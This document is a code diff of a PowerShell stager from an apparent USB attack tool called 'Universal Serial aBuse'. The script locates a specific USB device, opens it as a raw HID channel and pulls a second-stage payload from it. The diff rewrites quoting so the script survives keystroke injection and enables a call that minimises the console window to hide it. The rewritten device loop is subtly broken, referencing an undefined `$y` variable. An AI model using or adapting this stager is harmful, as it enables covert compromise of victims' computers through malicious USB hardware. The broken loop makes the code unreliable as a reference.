@@ -5,16 +5,16 @@ $ui.WindowTitle = 'Universal Serial aBuse'
 Clear
 
 $M = 64
-$cs = @"
+$cs = '
 using System;
 using System.IO;
 using Microsoft.Win32.SafeHandles;
 using System.Runtime.InteropServices;
 namespace n {
 	public class w {
-		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		[DllImport(%kernel32.dll%, CharSet = CharSet.Auto, SetLastError = true)]
         public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
-		[DllImport("user32.dll")]
+		[DllImport(%user32.dll%)]
 		public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
 
 		public static FileStream o(string fn) {
@@ -22,15 +22,16 @@ namespace n {
 		}
 	}
 }
-"@
+'.Replace('%',[char]34)
 Add-Type -TypeDefinition $cs
 function stage() {
-	# [n.w]::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 6) # change 6 to 0 to hide
-	gwmi Win32_USBControllerDevice|%{[wmi]($_.Dependent)}|where {
-		$_.GetPropertyValue("DeviceID") -match ("03EB&PID_2066") -and 
-		($_.GetPropertyValue("Service") -eq $null)} | % {
-		$fn = ("\??\" + $_.GetPropertyValue("DeviceID").ToString().Replace("\", "#") + "#{4d1e55b2-f16f-11cf-88cb-001111000030}") # Generic HID
-		# $fn = ("\??\" + $_.GetPropertyValue("DeviceID").ToString().Replace("\", "#") + "#{a5dcbf10-6530-11d2-901f-00c04fb951ed}") # Text Printer
+	[n.w]::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 6)
+	$devs = gwmi Win32_USBControllerDevice
+	foreach ($dev in $devs) {
+		$wmidev = [wmi]$y.Dependent
+		if ($wmidev.GetPropertyValue('DeviceID') -match ('03EB&PID_2066') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
+			$fn = ([char]92+'??'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
+		}
 	}
 	$f = [n.w]::o($fn)
     $g = 0
@@ -48,7 +49,7 @@ function stage() {
             }
             $s.Write($b, $o+2, $b[1]-$o)
             $g+=$b[1]-$o
-            [System.Console]::WriteLine([String]::Format("{0} of {1}",$g, $e))
+            [System.Console]::WriteLine([String]::Format('{0} of {1}',$g, $e))
         }
     } while ($g -lt $e)
 	clhy
